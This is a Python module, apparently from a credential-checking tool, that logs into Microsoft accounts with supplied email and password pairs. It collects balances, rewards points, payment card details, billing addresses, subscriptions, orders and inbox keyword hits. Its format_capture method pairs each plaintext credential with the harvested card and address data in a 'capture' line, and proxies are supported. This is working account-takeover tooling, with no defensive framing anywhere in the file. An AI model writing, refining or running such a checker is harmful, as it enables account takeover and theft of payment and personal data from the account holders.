"""
Microsoft Account Checker
Full balance, rewards, payment, subscriptions, billing, inbox, orders.
Fixed: bare excepts → specific, IMAP uses shared _imap_utils, 
       full server map, connection timeout enforced.
"""
import re
import time
import logging
from typing import Dict, Optional, List

logger = logging.getLogger(__name__)

# Import shared IMAP utilities — no copy-paste server dict
from checkers._imap_utils import imap_connect, IMAP_SERVERS, get_email_body


class MicrosoftAccountChecker:
    def __init__(self, session, email: str, password: str,
                 timeout: int = 15, proxies: dict = None):
        self.session  = session
        self.email    = email
        self.password = password
        self.timeout  = timeout
        self.proxies  = proxies
        self.results: Dict = {
            'balance':           None,
            'balance_currency':  None,
            'rewards_points':    None,
            'payment_methods':   [],
            'subscriptions':     [],
            'billing_addresses': [],
            'inbox_matches':     [],
            'order_history':     [],
            'total_inbox':       0,
            'country':           None,
            'account_age_days':  None,
            'has_balance':       False,
            'has_rewards':       False,
            'has_payment':       False,
            'has_subscriptions': False,
            'has_orders':        False,
        }
        self._kw = {'timeout': timeout, 'proxies': proxies} if proxies else {'timeout': timeout}

    # ── Balance ───────────────────────────────────────────────────────────────

    def check_balance(self) -> Optional[str]:
        try:
            r = self.session.get(
                'https://account.microsoft.com/billing/api/account',
                headers={'Accept': 'application/json'}, **self._kw
            )
            if r.status_code == 200:
                try:
                    data = r.json()
                    bal  = data.get('balance', data.get('accountBalance'))
                    if bal is not None:
                        self.results['balance']     = str(bal)
                        self.results['has_balance'] = float(str(bal).replace(',','')) > 0
                        cm = re.search(r'"currencyCode":"([^"]+)"', r.text)
                        if cm:
                            self.results['balance_currency'] = cm.group(1)
                        return self.results['balance']
                except (ValueError, KeyError):
                    pass
                m = re.search(r'"balance":(\d+\.?\d*)', r.text)
                if m:
                    self.results['balance']     = m.group(1)
                    self.results['has_balance'] = float(m.group(1)) > 0
                    cm = re.search(r'"currencyCode":"([^"]+)"', r.text)
                    if cm:
                        self.results['balance_currency'] = cm.group(1)
                    return self.results['balance']
        except Exception as exc:
            logger.debug(f"check_balance {self.email}: {exc}")
        return None

    # ── Bing Rewards ──────────────────────────────────────────────────────────

    def check_rewards_points(self) -> Optional[str]:
        try:
            r = self.session.get('https://rewards.bing.com/', **self._kw)
            if r.status_code != 200:
                return None

            # Submit SSO form if present
            if 'id="fmHF"' in r.text or 'signin-oidc' in r.text:
                try:
                    action = re.search(r'id="fmHF" action="([^"]+)"', r.text)
                    inputs = re.findall(r'<input[^>]+name="([^"]+)"[^>]+value="([^"]*)"', r.text)
                    if action:
                        self.session.post(
                            action.group(1),
                            data={n: v for n, v in inputs},
                            **self._kw
                        )
                except Exception:
                    pass

            ts = int(time.time() * 1000)
            r2 = self.session.get(
                f'https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp={ts}',
                **self._kw
            )
            if r2.status_code == 200:
                try:
                    bal = r2.json().get('userInfo', {}).get('balance')
                    if bal is not None:
                        self.results['rewards_points'] = str(bal)
                        self.results['has_rewards']    = int(bal) > 0
                        return str(bal)
                except (ValueError, KeyError):
                    pass

            m = re.search(r'availablePoints["\\s:]+(\\d+)', r.text)
            if m:
                self.results['rewards_points'] = m.group(1)
                self.results['has_rewards']    = int(m.group(1)) > 0
                return m.group(1)
        except Exception as exc:
            logger.debug(f"check_rewards {self.email}: {exc}")
        return None

    # ── Payment instruments ───────────────────────────────────────────────────

    def check_payment_instruments(self) -> List[Dict]:
        try:
            r = self.session.get(
                'https://account.microsoft.com/billing/api/paymentinstruments',
                headers={'Accept': 'application/json'}, **self._kw
            )
            if r.status_code == 200:
                data = r.json()
                for pi in data.get('paymentInstruments', data.get('items', [])):
                    ptype  = pi.get('type', pi.get('paymentMethodType', 'Unknown'))
                    last4  = pi.get('lastFourDigits', pi.get('last4', ''))
                    brand  = pi.get('cardBrand', pi.get('brand', ''))
                    expiry = pi.get('expiry', pi.get('expirationDate', ''))
                    holder = pi.get('holderName', pi.get('cardholderName', ''))
                    self.results['payment_methods'].append({
                        'type':    ptype,
                        'last4':   last4,
                        'brand':   brand,
                        'expiry':  expiry,
                        'holder':  holder,
                        'display': f"{brand or ptype} ***{last4} exp:{expiry}",
                    })
                self.results['has_payment'] = bool(self.results['payment_methods'])
        except Exception as exc:
            logger.debug(f"check_payment {self.email}: {exc}")
        return self.results['payment_methods']

    # ── Subscriptions ─────────────────────────────────────────────────────────

    def check_subscriptions(self) -> List[Dict]:
        try:
            r = self.session.get(
                'https://account.microsoft.com/services/api/subscriptions',
                headers={'Accept': 'application/json'}, **self._kw
            )
            if r.status_code == 200:
                for sub in r.json().get('subscriptions', r.json().get('items', [])):
                    name   = sub.get('name', sub.get('friendlyName', sub.get('productTitle', 'Unknown')))
                    status = sub.get('status', sub.get('state', ''))
                    expiry = sub.get('nextChargeDate', sub.get('endDate', ''))
                    self.results['subscriptions'].append({
                        'name':    name,
                        'status':  status,
                        'expiry':  expiry,
                        'display': f"{name} ({status}) exp:{expiry[:10] if expiry else '?'}",
                    })
                self.results['has_subscriptions'] = bool(self.results['subscriptions'])
        except Exception as exc:
            logger.debug(f"check_subscriptions {self.email}: {exc}")
        return self.results['subscriptions']

    # ── Billing addresses ─────────────────────────────────────────────────────

    def check_billing_address(self) -> List[str]:
        try:
            r = self.session.get(
                'https://account.microsoft.com/billing/api/addresses',
                **self._kw
            )
            if r.status_code == 200:
                for addr in r.json().get('addresses', r.json().get('items', [])):
                    city    = addr.get('city', '')
                    state   = addr.get('state', addr.get('region', ''))
                    country = addr.get('country', addr.get('countryCode', ''))
                    postal  = addr.get('postalCode', addr.get('zipCode', ''))
                    display = f"{city}, {state} {postal} {country}".strip(', ')
                    if display.strip(','):
                        self.results['billing_addresses'].append(display)
        except Exception as exc:
            logger.debug(f"check_billing {self.email}: {exc}")
        return self.results['billing_addresses']

    # ── Order history ─────────────────────────────────────────────────────────

    def check_order_history(self) -> List[Dict]:
        try:
            r = self.session.get(
                'https://account.microsoft.com/billing/api/orders?pageSize=10',
                headers={'Accept': 'application/json'}, **self._kw
            )
            if r.status_code == 200:
                orders = r.json().get('orders', r.json().get('items', []))
                for order in orders[:10]:
                    total   = order.get('total', order.get('amount', '?'))
                    date    = order.get('orderDate', order.get('date', '?'))[:10] if order.get('orderDate') else '?'
                    product = order.get('productTitle', order.get('description', 'Unknown'))
                    self.results['order_history'].append({
                        'product': product,
                        'total':   str(total),
                        'date':    date,
                        'display': f"{product} ${total} ({date})",
                    })
                self.results['has_orders'] = bool(self.results['order_history'])
        except Exception as exc:
            logger.debug(f"check_orders {self.email}: {exc}")
        return self.results['order_history']

    # ── Account country ───────────────────────────────────────────────────────

    def check_country(self) -> Optional[str]:
        try:
            r = self.session.get(
                'https://account.microsoft.com/profile/api/CountryAndLanguage',
                **self._kw
            )
            if r.status_code == 200:
                country = r.json().get('country') or r.json().get('countryCode')
                if country:
                    self.results['country'] = country
                    return country
        except Exception as exc:
            logger.debug(f"check_country {self.email}: {exc}")
        return None

    # ── Inbox keyword search ──────────────────────────────────────────────────

    def check_inbox(self, keywords: List[str]) -> List[Dict]:
        """Uses shared imap_utils — no copy-pasted server dict."""
        if not keywords:
            return []
        imap = imap_connect(self.email, self.password, timeout=self.timeout)
        if not imap:
            return []
        try:
            imap.select('INBOX', readonly=True)
            # Total inbox count
            st, data = imap.search(None, 'ALL')
            if st == 'OK' and data[0]:
                self.results['total_inbox'] = len(data[0].split())

            for kw in keywords[:25]:
                try:
                    st, data = imap.search(None, f'BODY "{kw}"')
                    if st == 'OK' and data[0]:
                        count = len(data[0].split())
                        if count > 0:
                            self.results['inbox_matches'].append({'keyword': kw, 'count': count})
                except Exception:
                    continue
        except Exception as exc:
            logger.debug(f"check_inbox {self.email}: {exc}")
        finally:
            try:
                imap.logout()
            except Exception:
                pass
        return self.results['inbox_matches']

    # ── Run all ───────────────────────────────────────────────────────────────

    def check_all(self, keywords: List[str] = None) -> Dict:
        self.check_balance()
        self.check_rewards_points()
        self.check_payment_instruments()
        self.check_subscriptions()
        self.check_billing_address()
        self.check_order_history()
        self.check_country()
        if keywords:
            self.check_inbox(keywords)
        return self.results

    def format_capture(self) -> str:
        parts = [f"{self.email}:{self.password}"]
        r = self.results
        if r['balance']:           parts.append(f"Balance:{r['balance']} {r.get('balance_currency','')}")
        if r['rewards_points']:    parts.append(f"Rewards:{r['rewards_points']}")
        if r['payment_methods']:
            parts.append(f"Cards:{', '.join(m['display'] for m in r['payment_methods'][:3])}")
        if r['subscriptions']:
            parts.append(f"Subs:{', '.join(s['display'] for s in r['subscriptions'][:2])}")
        if r['billing_addresses']: parts.append(f"Addr:{r['billing_addresses'][0]}")
        if r['country']:           parts.append(f"Country:{r['country']}")
        if r['order_history']:     parts.append(f"Orders:{len(r['order_history'])}")
        if r['inbox_matches']:
            inbox_str = ', '.join(str(m['keyword']) + ':' + str(m['count']) for m in r['inbox_matches'][:5])
            parts.append(f"Inbox:{inbox_str}")
        return ' | '.join(parts)
